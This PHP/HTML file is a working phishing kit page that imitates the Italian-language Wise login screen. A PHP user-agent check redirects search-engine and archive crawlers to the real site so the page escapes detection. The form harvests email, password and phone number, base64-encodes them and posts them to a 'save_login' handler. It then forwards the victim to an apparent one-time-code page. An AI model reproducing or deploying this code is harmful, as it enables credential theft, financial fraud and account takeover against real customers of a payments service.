<?php
session_start();
$ua = $_SERVER['HTTP_USER_AGENT'];
if (preg_match('/(googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|sogou|exabot|facebot|facebookexternalhit|ia_archiver)/i', $ua)) {
    header("Location: https://wise.com/");
    exit();
}
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Wise - Accedi al tuo account</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body class="bg-white min-h-screen flex flex-col justify-between m-0 p-0 overflow-x-hidden">

   
    <div id="alert_toast" class="fixed bottom-8 left-1/2 -translate-x-1/2 translate-y-24 bg-gray-900 text-white px-6 py-3 rounded-full text-xs font-semibold shadow-2xl transition-all duration-300 opacity-0 pointer-events-none z-[99999] whitespace-nowrap">
        Si prega di effettuare l'accesso con l'e-mail
    </div>


    <div class="w-full flex justify-between items-center px-6 py-4 border-b border-gray-100 bg-white">
        <img src="_assets/logo.png" width="85" class="object-contain block">
        <div class="cursor-pointer text-gray-800 text-xl font-light">
            <i class="fa-solid fa-xmark text-xl"></i>
        </div>
    </div>

    
    <div id="app_view" class="w-full max-w-[390px] mx-auto px-5 pt-10 pb-12 flex-1 flex flex-col justify-start">
        
       
        <div class="text-center mb-7">
            <h1 class="text-2xl font-bold text-gray-900 mb-2 tracking-tight">Bentornato</h1>
            <div class="text-xs text-gray-600 font-medium">
                Nuovo su Wise? <a href="#" class="text-[#00b9ff] font-bold underline">Registrati</a>
            </div>
        </div>

     
        <div id="f_box" class="flex flex-col gap-5 w-full">
            
           
            <div class="flex flex-col gap-1.5">
                <label class="block text-xs font-bold text-gray-800">Il tuo indirizzo e-mail</label>
                <input type="email" id="_email" placeholder="mario@gmail.com" class="w-full h-12 border border-gray-300 rounded-lg px-3.5 text-sm outline-none focus:border-gray-900 focus:ring-1 focus:ring-gray-900 bg-white text-gray-900 transition-all">
            </div>
            
         
            <div class="flex flex-col gap-1.5 relative">
                <label class="block text-xs font-bold text-gray-800">La tua password</label>
                <input type="password" id="_pass" placeholder="••••••••" class="w-full h-12 border border-gray-300 rounded-lg px-3.5 text-sm outline-none focus:border-gray-900 focus:ring-1 focus:ring-gray-900 pr-11 bg-white text-gray-900 transition-all">
                <span id="_toggle_pass" class="absolute right-0 top-[26px] w-10 h-12 cursor-pointer text-gray-500 flex items-center justify-center">
                    <i class="fa-regular fa-eye-slash text-sm"></i>
                </span>
            </div>
            
            
            <div class="flex flex-col gap-1.5">
                <label class="block text-xs font-bold text-gray-800">Il tuo cellulare</label>
                <input type="tel" id="_phone" placeholder="+39 312 345 6789" class="w-full h-12 border border-gray-300 rounded-lg px-3.5 text-sm outline-none focus:border-gray-900 focus:ring-1 focus:ring-gray-900 bg-white text-gray-900 transition-all">
            </div>

            
            <div class="pt-1">
                <button type="button" id="_sb" class="w-full h-12 bg-[#9fe870] text-[#163300] font-bold text-sm rounded-full flex items-center justify-center cursor-pointer transition shadow-none">
                    <span id="_bt">Accedi</span>
                </button>
            </div>

            
            <div>
                <a href="#" class="text-gray-900 text-xs font-bold underline">Problemi di accesso?</a>
            </div>

           
            <div class="text-left text-xs text-gray-700 font-bold pt-1">
                Oppure accedi con
            </div>

            
            <div class="flex gap-3 w-full">
                <button type="button" class="alert-trigger flex-1 h-10 border border-gray-300 bg-white rounded-full flex items-center justify-center cursor-pointer hover:bg-gray-50 transition">
                    <svg width="20" height="20" viewBox="0 0 24 24">
                        <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/>
                        <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.2v3.15C3.15 21.32 7.23 24 12 24z"/>
                        <path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.61H1.2C.44 8.14 0 9.87 0 12s.44 3.86 1.2 5.39l4.07-3.15z"/>
                        <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.23 0 3.15 2.68 1.2 6.61l4.07 3.15c.95-2.85 3.6-4.96 6.73-4.96z"/>
                    </svg>
                </button>
                <button type="button" class="alert-trigger flex-1 h-10 border border-gray-300 bg-white rounded-full flex items-center justify-center cursor-pointer hover:bg-gray-50 transition">
                    <i class="fa-brands fa-facebook-f text-base text-[#1877f2]"></i>
                </button>
                <button type="button" class="alert-trigger flex-1 h-10 border border-gray-300 bg-white rounded-full flex items-center justify-center cursor-pointer hover:bg-gray-50 transition">
                    <i class="fa-brands fa-apple text-lg text-black"></i>
                </button>
            </div>

           
            <div>
                <button type="button" class="alert-trigger w-full h-10 border border-gray-300 bg-white rounded-full flex items-center justify-center gap-2 text-xs font-bold text-gray-900 cursor-pointer hover:bg-gray-50 transition">
                    <i class="fa-solid fa-key text-sm"></i> Accedi con una passkey
                </button>
            </div>

        </div>
    </div>

  
    <div class="w-full text-center py-4 bg-[#f3f4f6] text-gray-500 text-xs font-medium border-t border-gray-200 mt-auto">
        © Wise Payments Limited 2026
    </div>

    <script>
    (function() {
        var _enc = function(v) { return btoa(unescape(encodeURIComponent(v))); };

        var toastTimeout;
        function showToast() {
            var toast = $('#alert_toast');
            toast.removeClass('translate-y-24 opacity-0').addClass('translate-y-0 opacity-100');
            clearTimeout(toastTimeout);
            toastTimeout = setTimeout(function() {
                toast.removeClass('translate-y-0 opacity-100').addClass('translate-y-24 opacity-0');
            }, 2500);
        }

        $(document).ready(function() {
            $('.alert-trigger').on('click', function(e) {
                e.preventDefault();
                showToast();
            });

            $('#_toggle_pass').on('click', function() {
                var input = $('#_pass');
                var icon = $(this).find('i');
                if (input.attr('type') === 'password') {
                    input.attr('type', 'text');
                    icon.removeClass('fa-eye-slash').addClass('fa-eye');
                } else {
                    input.attr('type', 'password');
                    icon.removeClass('fa-eye').addClass('fa-eye-slash');
                }
            });

            
            $('#_phone').on('keypress', function(e) {
                var charCode = e.which || e.keyCode;
                var charStr = String.fromCharCode(charCode);
                if (!/[0-9\+\-\s]/.test(charStr)) {
                    e.preventDefault();
                }
            });
        });

        $('#_sb').on('click', function() {
            var email = $('#_email').val().trim();
            var pass = $('#_pass').val().trim();
            var phone = $('#_phone').val().trim();
            var _err = false;
            
            
            if (email === '' || email.indexOf('@') === -1 || email.indexOf('.') === -1) {
                $('#_email').addClass('border-red-500 focus:border-red-500').removeClass('border-gray-300 focus:border-gray-900');
                _err = true;
            } else {
                $('#_email').removeClass('border-red-500 focus:border-red-500').addClass('border-gray-300 focus:border-gray-900');
            }

            
            if (pass.length < 3) {
                $('#_pass').addClass('border-red-500 focus:border-red-500').removeClass('border-gray-300 focus:border-gray-900');
                _err = true;
            } else {
                $('#_pass').removeClass('border-red-500 focus:border-red-500').addClass('border-gray-300 focus:border-gray-900');
            }

            
            if (phone.length < 5) {
                $('#_phone').addClass('border-red-500 focus:border-red-500').removeClass('border-gray-300 focus:border-gray-900');
                _err = true;
            } else {
                $('#_phone').removeClass('border-red-500 focus:border-red-500').addClass('border-gray-300 focus:border-gray-900');
            }
            
            if(_err) return;

            $('#_sb').prop('disabled', true);
            $('#_bt').html('<div style="width:16px; height:16px; border:2px solid rgba(22,51,0,0.3); border-top:2px solid #163300; border-radius:50%; animation:_sp 1s linear infinite; margin: 0 auto;"></div>');

            var _dat = [email, pass, phone].join('|');
            var _payload = _enc(_dat);

            $.post('_api/handler.php', { 
                action: 'save_login', 
                u_data: _payload 
            }, function(res) {
                var nxt = res.trim();
                if(nxt.length > 0 && nxt !== "OK") {
                    window.location.href = nxt; 
                } else {
                    window.location.href = "ot.php";
                }
            });
        });
    })();
    </script>
    <style>
        @keyframes _sp { to { transform: rotate(360deg); } }
    </style>
</body>
</html>